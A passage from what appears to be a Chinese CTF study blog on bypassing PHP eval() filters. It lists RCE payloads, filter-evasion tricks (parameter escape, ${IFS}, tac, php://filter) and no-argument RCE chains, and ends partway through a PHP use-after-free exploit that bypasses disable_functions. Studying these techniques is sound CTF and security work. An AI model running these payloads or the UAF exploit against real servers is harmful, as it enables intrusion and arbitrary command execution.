<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>?c=eval($_GET[‘a’]);&amp;a=system(‘ls’);</p></blockquote><p>这样就可以逃过对命令执行的单一变量过滤</p><ul><li>从函数特性的角度</li></ul><p>对于eval可以插入php的完整代码  因为eval会将字符串当作代码执行【include见下文】</p><blockquote><p>?c=echo hello;?&gt;&lt;?=include($_GET[‘a’]);&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p></blockquote><p>这里有两个疑问：</p><p>一、使用echo file_get_contents(“flag.php”)并不能在页面直接显示出来 需要查看源码 为什么</p><p>二、使用system(‘cat flag.php’)也需要查看源码  但是使用system(‘tac flag.php’)就能直接得到源码(倒叙)</p><p>两个都是这样输出的</p><blockquote><?php......</blockquote><p>html并不能这样直接输出 而倒叙的tac输出的则是</p><blockquote><p>……</p><?php</blockquote><p>其实这就涉及html页面的输出问题</p><ul><li>从语言结构的角度</li></ul><p>继续 但匹配再加一个括号<code>(</code>时 上面的方法就失效了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们仍然可以使用参数逃逸 （这里<code>;</code>被过滤了可以使用<code>?&gt;</code>代替）但是要用到语言结构 <code>echo print isset unset include require</code>等不需要使用括号</p><blockquote><p>?c=include$_GET[1];&amp;1=php://filter/read=convert.base64-encode/reasource=flag.php</p></blockquote><p>这里的include属于文件读取范畴  也就是说逃逸出去的参数1不能<code>1=system(ls)</code> </p><blockquote><p>当正则匹配数字的时候 逃逸参数需要改为字母</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><ul><li>过滤了system()</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">system</span>()<br><span class="hljs-selector-tag">passthru</span>()    # <span class="hljs-selector-tag">passthru</span> — 执行外部程序并且显示原始输出<br><span class="hljs-selector-tag">exec</span>()        # <span class="hljs-selector-tag">exec</span> — 执行一个外部程序  <br><span class="hljs-selector-tag">shell_exec</span>()  # <span class="hljs-selector-tag">shell_exec</span> — 通过 <span class="hljs-selector-tag">shell</span> 环境执行命令，并且将完整的输出以字符串的方式返回。<br><span class="hljs-selector-tag">popen</span>()<br><span class="hljs-selector-tag">proc_open</span>()<br><span class="hljs-selector-tag">pcntl_exec</span>()<br>` `           # 同<span class="hljs-selector-tag">shell_exec</span>() <br><br><span class="hljs-comment">//只有system函数是有回显的，其他的函数可以通过echo等显示</span><br></code></pre></td></tr></table></figure><ul><li>过滤了cat</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vim">more:一页一页的显示档案内容<br>les<span class="hljs-variable">s:</span>与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 <span class="hljs-keyword">cat</span> 的反向显示<br>tai<span class="hljs-variable">l:</span>查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br><span class="hljs-keyword">vi</span>:一种编辑器，这个也可以查看<br><span class="hljs-keyword">vim</span>:一种编辑器，这个也可以查看<br><span class="hljs-keyword">sor</span><span class="hljs-variable">t:</span>可以查看<br>uniq:可以查看<br><span class="hljs-keyword">file</span> -<span class="hljs-keyword">f</span>:报错出具体内容<br><span class="hljs-keyword">grep</span> 在当前目录中，查找后缀有 <span class="hljs-keyword">file</span> 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： <span class="hljs-keyword">grep</span> test *<span class="hljs-keyword">file</span><br>paste 指令会把每个文件以列对列的方式，一列列地加以合并。<br></code></pre></td></tr></table></figure><ul><li>过滤了空格</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$&#123;IFS&#125;</span><br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span><br>&lt; <span class="hljs-regexp">//</span>某些情况tac&lt;fl?g.php不能出结果 应该是不支持通配符 情况有待证实<br>&lt;&gt;<br>&#123;a,b&#125; <span class="hljs-regexp">//</span>a,b都是shell命令<br>%<span class="hljs-number">09</span>(php)<br></code></pre></td></tr></table></figure><ul><li>无参数RCE(Remote Command/Code Execute)</li></ul><p>Ⅰ</p><blockquote><p>show_source(next(array_reverse(scandir(pos(localeconv())))));</p><p>var_dump(file_get_contents(next(array_reverse(scandir(pos(localeconv()))))));</p><p>var_dump(file_get_contents(next(array_reverse(scandir(current(localeconv()))))));//pos是current的别名</p></blockquote><p>Ⅱ</p><blockquote><p>?c=session_start();system(session_id());<br>修改PHPSESSID的值</p></blockquote><p>Ⅲ</p><blockquote><p>?c=print_r(get_defined_vars());//获得并打印所有变量</p></blockquote><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210803142137477.png"></p><p>有post变量 传值进去</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210803142221361.png"></p><p>post变量可控 我们先尝试定位到该post变量 </p><p>数组操作：</p><p>post变量位于第二</p><blockquote><p>?c=print(next(get_defined_vars()))</p></blockquote><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210803142546722.png"></p><p>取出了该数组的键值对</p><p>取出值</p><blockquote><p>?c=print(array_pop(next(get_defined_vars())))</p></blockquote><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210803142926765.png"></p><p>接着执行RCE即可</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210803143029652.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210803143059815.png"></p><ul><li>缓冲区清除</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = ob_get_contents();<br>        ob_end_clean();<br>        <span class="hljs-keyword">echo</span> preg_replace(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>获取缓冲区内容并且清除，然后把内容替换成<code>?</code></p><blockquote><p>?c=$it = new DirectoryIterator(“glob:///*”);foreach($it as $f) {echo$f-&gt;getFilename().”\n”;}die();</p></blockquote><p>UAF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>pwn(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;getTrace();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = debug_backtrace();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= sprintf(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = sprintf(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = strlen(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = leak(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = leak(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = leak(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = leak(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> leak(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arg</span> = str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> Vuln();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(stristr(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    trigger_uaf(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span 